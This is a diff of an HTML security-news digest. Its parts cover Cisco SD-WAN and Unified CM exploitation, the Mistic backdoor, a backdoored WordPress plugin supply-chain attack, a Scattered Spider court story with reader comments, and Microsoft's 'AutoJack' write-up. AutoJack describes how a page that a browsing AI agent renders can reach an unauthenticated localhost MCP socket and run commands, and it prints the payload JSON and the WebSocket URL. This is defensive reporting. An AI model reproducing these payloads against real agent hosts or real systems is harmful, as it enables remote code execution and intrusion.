+Due to the threat actor's extensive anti-forensic cleanup, several files associated with this intrusion were overwritten or deleted. However, forensic remnants of the malicious CSV payload were recovered.
+Detections and Hunting
+Mandiant encourages organizations to conduct proactive threat hunts focused on the tactics, techniques, and procedures (TTPs) outlined in this report to identify activity that may otherwise blend into routine operations. Because certain indicators of compromises may mirror legitimate administrative actions, it is critical to assess these observations against the established network posture to minimize false positives.
+As per Cisco’s guidance, any suspicious activity or confirmed IOCs should be forwarded to the Cisco TAC for comprehensive review and assistance.
+Unauthorized SSH Connections as vmanage-admin
+Monitor authentication logs (/var/log/auth.log
+) for logins originating from unexpected external IP addresses using the vmanage-admin user account.
+Jan 01 07:58:00 vManage sshd[20766]: Accepted publickey for vmanage-admin from <Threat Actor IP> port 48373 ssh2: RSA SHA256:<redacted>
+Jan 01 08:01:00 vManage sshd[25178]: Accepted keyboard-interactive/pam for admin from <Threat Actor IP> port 60552 ssh2
+Figure 5: SSH from unexpected origins
+Suspicious Password Change Events
+Audit password changes in /var/log/auth.log
+targeting the admin account in quick succession, particularly where credentials are set and subsequently reverted.
+Jan 01 08:00:00 vManage usermod[12345]: change user 'admin' password
+Jan 01 08:15:00 vManage usermod[12345]: change user 'admin' password
+Figure 6: Password changes
+Defenders should also inspect rollback files present within /var/confd/rollback/
+for configuration delta commits targeting user passwords:
+# Created by: vmanage-admin
+# Date: 2026-01-01 08:00:00
+# Via: netconf
+# Type: delta
+# Label:
+# Comment:
+# No: 10000
+# TransactionId: 12345678
+# Hostname: vManage
+system {
+aaa {
+user admin {
+password <redacted>;
+}
+}
+}
+Figure 7: Rollback files
+Suspicious Execution of the su
+Command
+Audit terminal command history and system logs (/var/log/auth.log
+) for successful switch user (su
+) executions from the admin account to unauthorized accounts (e.g., troot
+).
+Jan 01 08:03:00 vManage su[24289]: Successful su for troot by admin
+Figure 8: su
+logins
+Exploitation of CVE-2026-20245
+Monitor script logs (/var/log/scripts.log
+) for execution anomalies involving unauthorized execution of vconfd_script_upload_tenant_list.sh
+.
+Jan 01 08:01:05 vManage vScript: Tenant list upload per vsmart serial number: /usr/bin/vconfd_script_upload_tenant_list.sh -cli path /home/admin/evil_tenant.csv vpn 0
+Jan 01 08:01:05 vManage vScript: uploading tenant list via VPN 0 true
+Jan 01 08:01:05 vManage vScript: Copying ... /home/admin/evil_tenant.csv via VPN 0
+Jan 01 08:01:05 vManage vScript: Successfully loaded the tenant placement file
+Figure 9: Execution anomalies
+Defenders can also query active command execution history using show history within the Viptela CLI for the specific administrative upload commands:
+01-01 08:01:05 -- request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
+Figure 10: Command execution
+Google Security Operations (SecOps)
+Google SecOps customers have access to these broad category rules and more under the Mandiant Intel Emerging Threats rule pack. The activity discussed in the blog post is detected in Google SecOps under the rule names:
+-
+Privileged Account Append to Passwd Database
+-
+Grep Privileged User Account Discovery in Passwd or Shadow
+-
+Hidden Backup of Sensitive System Files
+-
+Suspicious Copy from Usr Share to User Hidden Directory
+Acknowledgements
+Mandiant would like to thank the Cisco Product Security Incident Response Team (PSIRT) for their collaboration and partnership throughout the coordinated disclosure process.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-5" class="article-body">
+            <h2 class="article-title">Stealthy Mistic backdoor linked to ransomware access broker KongTuke</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/stealthy-mistic-backdoor-linked-to-ransomware-access-broker-kongtuke/" target="_blank">Original Link</a></p>
+            <div class="content-text">A new backdoor dubbed Mistic has been observed in financially motivated attacks targeting organizations in the insurance, education, IT, and professional services sectors.
+The malware is believed to be linked to KongTuke/Woodgnat, an initial access broker active since at least 2024 that specializes in compromising corporate networks and selling that access to ransomware groups, including Qilin, Interlock, Rhysida, Akira, 8Base, and Black Basta.
+Researchers at cybersecurity company Symantec say that Mistic has been used in intrusions since April.
+In at least one incident, it was deployed shortly after ModeloRAT, a [backdoor attributed to KongTuke](https://www.bleepingcomputer.com/news/security/kongtuke-hackers-now-use-microsoft-teams-for-corporate-breaches/) and delivered via social engineering attacks over Microsoft Teams.
+Symantec believes that Mistic is a newly developed, stealthy backdoor designed for long-term persistence in compromised networks.
+Mistic attack chain
+In the attacks investigated by Symantec, the infection started with the launch of the legitimate executable MpExtMs.exe to side-load a malicious DLL named version.dll, which acts as the loader of Mistic (EndpointDlp.dll).
+The researchers note that the filename chosen for Mistic resembles Microsoft endpoint security tooling, which may help the malware blend in with trusted software on the host.
+A separate .NET DLL is also loaded, which displays a fake login screen to the victim to steal their account credentials.
+Once loaded, Mistic communicates with its command-and-control infrastructure and can receive commands from the operator. Symantec lists the following capabilities:
+- Upload/download, move, rename, delete files, and create folders
+- Modify how frequently Mistic checks for commands from the command-and-control (C2) server
+- Execute code received from the C2 directly in memory
+- Terminate itself and delete files from the host
+According to Symantec’s analysis, Mistic appears to have been designed for stealth, enabling attackers to maintain a persistent foothold within compromised networks over extended periods.
+“The backdoor runs payloads in memory with no file written to disk and includes a kill switch that lets it delete itself, which are features consistent with an operator seeking long-term, low-visibility access,” the [researchers say](https://www.security.com/threat-intelligence/new-mistic-backdoor-modeloRAT).
+Symantec does not provide details on how the infection begins, but KongTuke has been known to use ClickFix, and its [FileFix](https://www.bleepingcomputer.com/news/security/interlock-ransomware-adopts-filefix-method-to-deliver-malware/) and [CrashFix](https://www.bleepingcomputer.com/news/security/fake-ad-blocker-extension-crashes-the-browser-for-clickfix-attacks/) variants, since early 2025 to deliver the ModeloRAT malware.
+In a [technical report](http://www.zscaler.com/blogs/security-research/technical-analysis-mltbackdoor) this week, cloud security company Zscaler notes that Mistic, which it tracks as MTLBackdoor, was delivered as a payload in a multi-stage ClickFix infection chain in May.
+Zscaler researchers say that "one of the most powerful features [in MTLBackdoor] is the ability to load Beacon Object Files (BOFs) to expand its capabilities."
+BOFs are small programs in C that can execute directly in the memory of a command-and-control (C2) process, leaving no footprint on the disk and evading detection of security agents. They are common in red team products, such as Cobalt Strike, for the post-exploitation stage.
+Symantec believes that Mistic confirms the observed trend of custom tools being used in ransomware attacks, although the backdoor appears to have been developed by an initial access broker closely connected to the ransomware scene.
+KongTuke is known to use multiple other tools, such as the legitimate WinPython and Node.js runtimes to execute malicious code, finger.exe to retrieve obfuscated payloads, the [fake NexShield browser extension](https://www.bleepingcomputer.com/news/security/fake-ad-blocker-extension-crashes-the-browser-for-clickfix-attacks/), the encrypted GateKeeper .NET payload, and the MintsLoader and D3F@ck Loader malware loaders to deliver additional payloads.
+Both Zscaler and Symantec reports [[1](https://www.zscaler.com/blogs/security-research/technical-analysis-mltbackdoor), 2] provide indicators of compromise for the Mistic/MTLBackdoor malware and note that it is a stealthy tool that can expand its functionality.
+[Test every layer before attackers do](https://hubs.li/Q04jQ9z40)
+Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen.
+The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection.
+[Get the whitepaper](https://hubs.li/Q04jQ9z40)
+Post a Comment Community Rules
+You need to login in order to post a comment
+Not a member yet? Register Now</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-6" class="article-body">
+            <h2 class="article-title">Cisco Unified CM Flaw Exploited After PoC Reveals File-Write Path to Root</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/06/cisco-unified-cm-flaw-exploited-after.html" target="_blank">Original Link</a></p>
+            <div class="content-text">Threat actors have begun to exploit a recently disclosed critical security flaw impacting Cisco Unified Communications Manager (Unified CM) and Unified Communications Manager Session Management Edition (Unified CM SME).
+The vulnerability, tracked as [CVE-2026-20230](https://thehackernews.com/2026/06/cisco-patches-cve-2026-20230-in-unified.html) (CVSS score: 8.6), is a case of improper input validation for specific HTTP requests that could allow an unauthenticated, remote attacker to conduct server-side request forgery (SSRF) attacks through an affected device.
+"An attacker could exploit this vulnerability by sending a crafted HTTP request to an affected device," Cisco said in an advisory released earlier this month. "A successful exploit could allow the attacker to write files to the underlying operating system that could be used later to elevate to root."
+In a post shared on X earlier this week, Defused Cyber [said](https://x.com/DefusedCyber/status/2069074520057557244) it observed active exploitation of the vulnerability in attacks. "This is currently being exploited from a single source using an unvetted PoC, with genuinely-formatted file:// file-write payloads landing on our decoys," it noted.
+However, for successful exploitation to occur, the WebDialer service must be enabled. It's disabled by default. To check if the WebDialer is enabled, users can [complete](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cucm-ssrf-cXPnHcW) the following steps -
+- Log in to the Cisco Unified CM Administration interface
+- From the Navigation menu, choose Cisco Unified Serviceability and click Go
+- From the Tools menu, choose Control Center - Feature Services
+- In the CTI Services section of the page, check whether the current status of the Cisco WebDialer Web Service is Started or Not Running
+- If the status is Started, WebDialer is enabled
+The vulnerability has been patched in Unified CM and Unified CM SME versions 14SU6 and 15SU5. If immediate patching is not an option, it's advised to disable the WebDialer service until a fix can be applied.
+SSD Secure Disclosure has since [published](https://ssd-disclosure.com/cisco-unified-communications-manager-arbitrary-file-write-to-rce/) additional technical specifics of CVE-2026-20230, describing it as a flaw that allows unauthenticated attackers to arbitrarily write files in the server by leveraging the Webdialer component to obtain the true hostname of the target and ultimately achieve code execution.
+Cisco has yet to update the advisory to reflect the exploitation status. Last week, the network security company released security updates for a medium-severity security flaw in Catalyst SD-WAN Manager ([CVE-2026-20262](https://thehackernews.com/2026/06/cisco-releases-security-updates-for.html), CVSS score: 6.5) that has come under active exploitation in the wild.
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-7" class="article-body">
             <h2 class="article-title">Scattered Spider Hackers Plead Guilty on Day 1 of Trial</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/06/scattered-spider-hackers-plead-guilty-on-day-1-of-trial/" target="_blank">Original Link</a></p>
             <div class="content-text">Two men pleaded guilty in the United Kingdom this week to criminal charges stemming from an August 2024 cyberattack that crippled Transport for London, the entity responsible for the public transport network in the Greater London area. The duo were key members of a prolific cybercrime group known as Scattered Spider, and their guilty pleas came on the first day of what was expected to be a six-week trial.
@@ -102,195 +486,30 @@ The U.S. Department of Justice says three alleged Scattered Spider defendants in
 Flowers and Jubair are slated to be sentenced in a London court on July 15, 2026.
 More stupid young people throwing their lives away.
 Smart young adults potentially throwing their future away. Sigh…
+A friend of my nephew is a 23 year old guy with obvious talent who seems to be uninterested in a job.
+I think he wants me to retire and has the idea that he can take my job. However, he has neither the knowledge nor the temperament to do the job. He’s too much of a hothead and thinks that he knows absolutely everything about everything, especially computers and electronics.
+For example, when he first came to town, he was helping my nephew run a cable in someone’s house. They ran three cables and couldn’t get any of the runs to work. He claimed the cable was rotten, that the connectors were bad, and that the cable tool was broken. There was nothing wrong with any of that — the issue is with his own arrogant belief that nothing is ever his fault.
+He is not my employee — he has too many red flags for me to consider him for a job.
 What must their parents think?
 Should we expect more arrests soon?
 While it is difficult to trace many spammers and scammers through the cyberlabyrinth of the WWW, it is heartening to see that over time, more of these lost souls are being caught.
 The sad thing is that so many of them are still kids. The question of what their parents must think makes me wonder if they were even present at all. Parenting usually involves some kind of monitoring to see what your kid is doing online for so long before they get to the age these doofuses are at, where they inevitably make some kind of mistake and get caught. They are old enough now to know better… and to face the consequences as well.
+…parents just need to tell their kids “don’t be a f***ing thief!”. Say it enough times and they’ll get it. Teach the basics of morality.
 Hello, Brian:
 If I recall, you said that Scattered Spider has a robust, large recruiting base. From what I remember, less than a dozen of them have been apprehended, and most of them were not high-level members, although from what I can garner from your site and a few others, the Vegas ransomings were particularly treacherous.
 Do you have any idea what the current rough count is of active members, according to the threat researchers? I am guessing most of its ersatz members don’t know much about any of the others so I doubt previous models to round em all up would work.
 The catch all name seems kind of deceptive, especially to C-level types who don’t even get they can be ransomed months later by other people that most reporters and companies might call the same group. Are they really?
-Thanks.</div>
+Thanks.
+I don’t think the courts and laws have caught up with what should be more severe penalties for cyber crimes; they don’t quite get the blast radius of the infractions. Kids on the street stealing far far less and effecting almost no one, often get much harsher sentences in comparison.
+They are more connected than people think. Just like the jellyfish-like drone swarms. I wouldn’t be so quick to assume they aren’t mutually aware, like some effed up MUFON.
+Hacking sure wasn’t like that fifteen years ago.
+And wouldn’t you know it they wanted fictional time machines then also.
+“Throwing their lives away” to be future security consultants when they do their face turn.</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-3" class="article-body">
-            <h2 class="article-title">LastPass confirms data breach in Klue supply chain attack</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/lastpass-confirms-data-breach-in-klue-supply-chain-attack/" target="_blank">Original Link</a></p>
-            <div class="content-text">LastPass announced that hackers accessed customer data from its Salesforce environment after stealing the company's OAuth tokens in the Klue supply chain attack earlier this month. [...]
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-4" class="article-body">
-            <h2 class="article-title">ShapedPlugin WordPress Pro Plugins Backdoored in Supply Chain Attack</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/06/shapedplugin-wordpress-pro-plugins.html" target="_blank">Original Link</a></p>
-            <div class="content-text">Multiple WordPress plugins from [ShapedPlugin](https://shapedplugin.com/) were compromised in a supply chain attack after unknown threat actors managed to tamper with the official release channels and push backdoor code.
-"Attackers compromised the vendor's build and distribution pipeline, injecting backdoor code into Pro plugin releases distributed through official licensed update channels," Wordfence [said](https://www.wordfence.com/blog/2026/06/psa-supply-chain-compromise-targets-shapedplugin-backdoored-pro-plugins-distributed-via-official-channels/) in an analysis published last week.
-The incident affects the following plugins -
-- Product Slider Pro for WooCommerce (versions before 3.5.4)
-- Real Testimonials Pro (version 3.2.5)
-- Smart Post Show Pro (versions before 4.0.2)
-As mentioned above, it's worth emphasizing that the compromise only affects Pro plugin builds distributed through the vendor's Easy Digital Downloads (EDD) infrastructure via account.shapedplugin[.]com. The free versions of the plugins on WordPress.org are not impacted.
-The supply chain compromise associated with Product Slider Pro for WooCommerce has been assigned the CVE identifier [CVE-2026-49777](https://www.cve.org/CVERecord?id=CVE-2026-49777), along with a CVSS score of 10.0, indicating maximum severity. [CVE-2026-10735](https://www.cve.org/CVERecord?id=CVE-2026-10735) (CVSS score: 9.8) is the CVE identifier for the entire incident.
-The WordPress security company said the compromised versions of the plugins incorporate a loader that's triggered on every admin page, causing it to fetch a payload from a remote server ("194.76.217[.]28:2871"), install it, and activate it as a fake plugin.
-Once it's activated, the malware reports the victim domain back to the server and erases itself to cover up the tracks and complicate incident response efforts. The counterfeit plugin, for its part, hides itself from the WordPress admin plugin list and is capable of capturing credentials in plaintext and two-factor authentication (2FA) codes.
-It also establishes multiple persistence methods that enable arbitrary file writes via a custom REST endpoint when provided a specific authentication token, as well as drop a web shell with command execution features. Lastly, it makes use of a PHP file named "install-persistent.php," which is bundled as part of the plugin, to extract the below data -
-- Full contents of wp-config.php, including database credentials, authentication keys, and debug settings
-- All administrator accounts with registration dates
-- Mail plugin credentials from WP Mail SMTP, Post SMTP, and Easy WP SMTP
-- WooCommerce order data from the last 3 months with payment method breakdown
-Once this information is displayed, the file is deleted. Evidence indicates that the attack could be a compromise of the build pipeline, as opposed to a direct poisoning of the packages.
-What's particularly dangerous about this attack is that it exposes site owners who purchased legitimate licenses and installed updates directly from the vendor's official update system to malware.
-Upon being notified of the issue, ShapedPlugin has confirmed the incident, adding that it's reviewing the distribution and release processes to ensure the integrity of its products going forward. New versions of the impacted plugins are expected to be released pending comprehensive security reviews and validation tests.
-Site owners who have installed the malicious versions are recommended to reset all passwords, revoke and regenerate 2FA secrets for all users, review administrator accounts for unauthorized additions, and check mail plugin configurations for modified SMTP credentials.
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-5" class="article-body">
-            <h2 class="article-title">AutoJack: How a single page can RCE the host running your AI agent</h2>
-            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/06/18/autojack-single-page-rce-host-running-ai-agent/" target="_blank">Original Link</a></p>
-            <div class="content-text">Ongoing research into AI agent framework security identified an exploit chain in AutoGen Studio (AutoGen’s open-source prototyping user interface) that allows untrusted web content rendered by a browsing agent to reach a local Model Context Protocol (MCP) WebSocket and spawn arbitrary processes on the host. The technique, which we call AutoJack, jacks the agent into becoming the attacker’s last-mile delivery vehicle by crossing the localhost trust boundary that many developer tools rely on.
-We reported the behavior to the Microsoft Security Response Center (MSRC); following the report the maintainers hardened the upstream main branch in commit b047730. This issue was identified and addressed during development. The affected MCP WebSocket surface was never included in a Python Package Index (PyPI) release, so users who install AutoGen Studio from PyPI aren’t exposed to this specific chain.
-The broader lesson is general: if an agent can browse untrusted pages and also talk to privileged local services, loopback can become an attack surface and control planes must be authenticated, authorized, and isolated.
-Why we are looking at agent frameworks
-Modern AI agents are not just text generators. They read files, browse pages, call APIs, and shell out to tools. That is exactly what makes them useful, and exactly why there is investment in finding systemic execution risks in the frameworks that wire models to tools. Earlier in this series we covered RCE primitives in [Microsoft Semantic Kernel](https://www.microsoft.com/en-us/security/blog/2026/05/07/prompts-become-shells-rce-vulnerabilities-ai-agent-frameworks/). In this post we move one layer up the stack to an infrastructure and developer-facing prototyping surface and show how the same agent capabilities that make these tools valuable for experimentation can become a delivery channel for remote code execution when the prototype runs without safeguards.
-The takeaway is not to avoid prototypes. It is this: when an agent on your core server or laptop can browse the open web and communicate with privileged local services, localhost stops being a trust boundary. Defenders need to plan for that, and these findings show why.
-What is AutoGen Studio
-[AutoGen Studio](https://microsoft.github.io/autogen/docs/autogen-studio/getting-started) is a user interface (UI) on top of [AutoGen](https://microsoft.github.io/autogen/), Microsoft Research’s framework for multi-agent systems. It lets developers compose agents, attach tools, including MCP servers, and run quick experiments. Its documentation is clear about intended use. In other words, it is a research prototype with expected developer-experience tradeoffs: defaults tuned for ease of iteration rather than hardened deployment.
-The AutoJack chain at a glance
-The explanation below is for demonstrative purposes only. The exploit chain doesn’t work on current builds. It is included here so that defenders can recognize the pattern in other agent frameworks.
-The exploit chain composes three independent weaknesses in AutoGen Studio’s MCP WebSocket surface:
-- Origin allowlist trusts localhost – but a local agent is localhost (CWE-1385 – Missing Origin Validation in WebSockets): The MCP WebSocket only accepts connections whose Origin is http://127.0.0.1 or http://localhost. That blocks a browser pointed at evil.com. It does not block JavaScript that is rendered by a headless browser owned by an AutoGen agent on the same machine.
-- Authentication middleware is opt-out for MCP paths (CWE-306 – Missing Authentication for Critical Function): The auth middleware in AutoGen Studio explicitly skipped /api/mcp/* (and /api/ws/*) on the assumption that these would do their own checks. The MCP WebSocket handler did not implement that follow-up check. As a result, the MCP WebSocket accepted connections without any authentication regardless of the auth mode configured for the rest of the app.
-- StdioServerParams from the URL is executed verbatim (CWE-78 – Improper Neutralization of Special Elements used in an OS Command): The endpoint accepted a server_params query parameter, base64-decoded a JSON blob into StdioServerParams, and handed command + args to stdio_client(…). There was no allowlist – calc.exe, powershell.exe -enc …, or bash -c ‘…’ were all accepted as “MCP servers.”
-Chain these together with a webpage on the open internet, rendered by an AutoGen agent running on the same machine, and you have a remote code execution primitive. No user interaction is required beyond getting the agent to render the attacker’s page.
-We named the technique AutoJack: an attacker carjacks the browsing agent and uses it as a confused deputy to drive across the localhost boundary into AutoGen Studio’s MCP control plane.
-Anatomy of the chain
-Issue 1: Origin allowlist that the agent itself defeats
-AutoGen Studio’s MCP WebSocket relies on the conventional defense for browser-driven cross-site WebSocket hijacking (CSWSH): allow only same-origin connections from 127.0.0.1 / localhost.
-allowed_origins = [“http://127.0.0.1”, “http://localhost”]
-That is the right control for a human user opening a tab to evil[.]com. The browser will set the Origin header to hxxps://evil[.]com, the check will fail, and the connection will be refused.
-Origin checks alone are not the right control for an agent. An AutoGen agent equipped with built-in web-browsing tooling, such as MultimodalWebSurfer, fetch_webpage_tool, any Playwright-backed surfer, or a code-execution tool that runs requests/websockets is a process on the workstation. Anything it loads inherits the localhost identity. The “origin” of any JavaScript executed by that headless browser is whatever the agent navigated to – and the WebSocket call it then makes carries an Origin that satisfies the allowlist.
-Issue 2: Auth middleware that opts MCP out
-AutoGen Studio supports several authentication modes (none, github, msal, firebase). All of them are wired into a single AuthMiddleware that runs ahead of FastAPI route dispatch. In the version on PyPI, that middleware contains an early-return for WebSocket-style paths:
-1 2 3 | # auth excluded for these paths; they were intended to do their own checks if request.url.path.startswith("/api/ws") or request.url.path.startswith("/api/mcp"): return await call_next(request) |
-The intent is reasonable: ASGI middlewares cannot meaningfully gate WebSocket handshakes the same way they gate HTTP requests, so the design called for the WebSocket handler to enforce auth itself at accept time. The MCP (Model Context Protocol) route never picked up that responsibility. As a result, the table below holds for the released package:
-| Auth configuration | REST API protected? | /api/mcp/ws/* protected? |
-| type: none | No | No |
-| type: github | Yes | No |
-| type: msal | Yes | No |
-| type: firebase | Yes | No |
-Turning on auth in config.yaml does not close this hole on its own.
-Issue 3: server_paramsfrom the URL is the command line
-The MCP WebSocket route in the development build reads a server_params query parameter, base64-decodes it, JSON-parses it into StdioServerParams, and passes that into stdio_client(…):
-1 2 3 4 5 6 | @router.websocket("/ws/{session_id}") async def mcp_websocket(websocket: WebSocket, session_id: str): encoded = websocket.query_params.get("server_params") decoded = base64.b64decode(encoded) params = StdioServerParams(**json.loads(decoded)) await create_mcp_session(bridge, params, session_id) |
-StdioServerParams.command and StdioServerParams.args are passed to stdio_client, which uses them to spawn an MCP “server” process. There is no allowlist that the executable be an MCP-speaking binary, so the same plumbing happily spawns calc.exe, powershell.exe -enc …, or bash -c ‘…’.
-A minimal payload looks like:
-1 2 3 4 5 6 | { "type": "StdioServerParams", "command": "calc.exe", "args": [], "env": { "pwned": "true" } } |
-Base64-encoded into a query string, the full reach-out is:
-1 2 | ws://localhost:8081/api/mcp/ws/<session_id>?server_params=<base64(json)> </base64(json)></session_id> |
-Combined with Issues 1 and 2, all an attacker needs is for the agent to render a page that opens that URL.
-Putting it together: a realistic scenario
-To validate the end-to-end chain, we wrote two tiny harnesses:
-malicious_web_server.py: a web page served at http://attacker[.]example/websocket-interactive. Its only meaningful content is a <script> that opens the WebSocket above with a base64 payload that runs calc.exe.
-web_summarizer_app.py: a small “Web Content Summarizer” AutoGen agent wrapped in a Flask UI. The app takes a URL from the user and hands it to a MultimodalWebSurfer agent with the prompt “Browse this URL and summarize its content.” It is, in other words, a fully-fledged AutoGen agent that anyone could build on top of the framework – the Flask page is just the interface.
-The end-to-end flow looks like this:
-The developer has built an AutoGen agent such as a Web Page Summarizer, or any agent with browsing capabilities, that runs on the same machine as AutoGen Studio.
-An attacker plants a malicious comment on a legitimate news site, or a user asks the summarizer agent to summarize an attacker-controlled URL. This can happen through a direct prompt, a prompt injection in earlier content, or a URL field in the app.
-The agent’s browsing tool, MultimodalWebSurfer in our case, then navigates the headless browser to the attacker’s page.
-The page’s JavaScript opens ws://localhost:8081/api/mcp/ws/<id>?server_params=<base64>. Because the browser is on the same machine, the Origin is acceptable; because the auth middleware short-circuits /api/mcp/*, no token is required.
-AutoGen Studio decodes the payload and runs calc.exe (or anything else) under the developer’s account.
-Note that we packaged the demonstration as a controlled local proof of concept, See it end-to-end.
-The screenshots below show the full chain on a single workstation: the developer launches AutoGen Studio on localhost:8081 (the default port), opens the Web Content Summarizer app, and submits an attacker-controlled URL. Within seconds of MultimodalWebSurfer rendering the page, calc.exe pops on the developer’s desktop, launched by the AutoGen Studio process, not by the browser and not by the agent’s headless Chromium.
-Fixes and hardening measures applied
-The issue was fixed with the help of the Microsoft Security Response Center. The maintainers implemented the necessary hardening measures, helping protect users ahead of full release and broader adoption:
-Server-side parameter binding. On main, the WebSocket handler no longer reads server_params from the URL. A separate POST /api/mcp/ws/connect route stores the parameters server-side in pending_session_params, keyed by a universally unique identifier (UUID). The WebSocket handler pops the entry by session ID and refuses unknown IDs with close code 4004. The code comment is explicit: “This prevents attackers from injecting arbitrary server_params via the WebSocket query string.”
-Tighter auth skip list. The middleware skip-list on main no longer includes /api/mcp. It includes only /api/ws and /api/maker. MCP routes now flow through the normal auth path.
-These changes are present in the AutoGen main branch as of commit [b047730,](https://github.com/microsoft/autogen/commit/b0477309d2a0baf489aa256646e41e513ab3bfe8) and pyproject.toml on main is at version 0.7.2.
-Crucially, this issue was identified and remediated before any PyPI release, so the affected code never shipped in a published package. The exposure was limited to developers who built AutoGen Studio from the main GitHub branch during the window between the MCP plugin landing and the hardening commit. This was confirmed by downloading autogenstudio 0.4.2.2, the current published release, and inspecting its contents directly: the package doesn’t include autogenstudio/web/routes/mcp.py, the FastAPI application in app.py does not mount an /api/mcp router, and a recursive search across all 55 Python files found no matches for StdioServerParams or /api/mcp.. In other words, users who run pip install autogenstudio today gets a build that does not contain the MCP WebSocket attack surface at all.
-Mitigation and protection guidance
-If you are running AutoGen Studio
-Deploy AutoGen Studio strictly as a developer prototype in an isolated environment, not as an internet-exposed service, aligning as documented.
-If you install autogenstudio with pip (currently 0.4.2.2), you are not exposed to this specific chain. The issue was identified and addressed during development before any PyPI release, and the affected MCP WebSocket route is not present in the published package. The general guidance below still applies because the pattern (an agent on the box reaching localhost services) is broader than this one bug.
-If you build from the main branch for MCP support, use a build at or after commit [b047730](https://github.com/microsoft/autogen/commit/b0477309d2a0baf489aa256646e41e513ab3bfe8).
-Do not run AutoGen Studio with a browsing or arbitrary code execution agent on the same machine as untrusted content. That combination is the substrate the chain needs, and similar shapes will recur as the project evolves.
-Bind to loopback only and add a host firewall rule that blocks all non-loopback traffic to the port 8081 (default).
-Place AutoGen Studio behind an authenticated reverse proxy that enforces auth on all paths, including any future WebSocket or /api/* routes. Don’t rely on framework auth modes alone for control-plane endpoints.
-Run AutoGen Studio under a low-privilege account in a sandboxed user profile or container so that any future agent-driven RCE is contained to a dev profile, not your daily-driver account.
-If you are building agent apps on top of AutoGen
-The deeper lesson is broader beyond this one project. When an agent can both browse external content and reach privileged local services on localhost, it can unintentionally create a confused-deputy scenario. Defend against it by:
-Treating any tool parameter that is reachable from model output as attacker controlled.
-Refusing to bind sensitive control planes (debug endpoints, MCP control sockets, code executors, dev databases) to localhost without authentication. Loopback is an attack surface for any agent on that machine.
-Allowlisting which executables may be invoked as MCP “servers,” instead of accepting command/args from any caller.
-Separating the agent browsing identity from the developer’s identity (different OS user, container, or VM).
-How Microsoft helps secure agentic systems
-Microsoft security teams are actively researching how traditional software risks change when AI models connect to tools, browsers, code interpreters, and local services. This work informs guidance for developers and detections for defenders across Microsoft Defender, Microsoft Defender for Cloud, Microsoft Entra and Microsoft 365.
-Customers using Microsoft Defender, Microsoft Defender for Cloud, and Microsoft Entra can use these controls to detect, contain, and investigate related activity. Coverage depends on product licensing, configuration, and telemetry.
-At the model and agent layer (catch the manipulation)
-Azure AI Content Safety Prompt Shields detects user prompt injection and indirect prompt injection (cross-prompt injection attack, or XPIA), which can catch an early stage of this chain when attacker-controlled content steers an agent to navigate to a malicious page. Prompt Shields do not intercept the client-side JavaScript execution that follows, but they provide an early interception point when initial navigation is triggered through indirect prompt injection. Prompt Shields also integrate with Defender for Cloud AI threat protection so the security operations center (SOC) can see this signal.
-How Microsoft helps secure agentic systems
-Microsoft security teams are actively researching how traditional software risks change when AI models connect to tools, browsers, code interpreters, and local services. This work informs guidance for developers and detections for defenders across Microsoft Defender, Microsoft Defender for Cloud, Microsoft Entra and Microsoft 365.
-Customers using Microsoft Defender, Microsoft Defender for Cloud, and Microsoft Entra can use these controls to detect, contain, and investigate related activity. Coverage depends on product licensing, configuration, and telemetry.
-At the model and agent layer (catch the manipulation)
-Azure AI Content Safety Prompt Shields detects user prompt injection and indirect prompt injection (cross-prompt injection attack, or XPIA), which can catch an early stage of this chain when attacker-controlled content steers an agent to navigate to a malicious page. Prompt Shields do not intercept the client-side JavaScript execution that follows, but they provide an early interception point when initial navigation is triggered through indirect prompt injection. Prompt Shields also integrate with Defender for Cloud AI threat protection so the security operations center (SOC) can see this signal.
-Microsoft Defender for Cloud Threat Protection for AI Services raises alerts on jailbreak, data leakage, and credential theft patterns observed against Azure-hosted models, including models used by AutoGen agents when routed through Azure AI services.
-Microsoft Defender for Cloud AI Security Posture Management (AI-SPM) builds an AI bill of materials (AI BOM), scans infrastructure as code (IaC) and container dependencies for vulnerable AI components, and runs attack path analysis. This helps inventory where AutoGen Studio, or similar prototypes, is deployed across cloud and developer environments.
-Microsoft Foundry AI Red Teaming Agent and the open-source PyRIT automate adversarial probing for indirect prompt injection, prohibited actions, and sensitive data leakage. Run these tools against your own agent prototypes before allowing them to browse the open web.
-At the endpoint (catch the spawn and the post-exploitation)
-Microsoft Defender is a high-leverage control for this chain. The AutoJack primitive ends with a Python or Node parent process spawning an unexpected child process through StdioServerParams, which matches the behavioral pattern that endpoint detection and response (EDR) and automated investigation and response (AIR) are designed to catch.
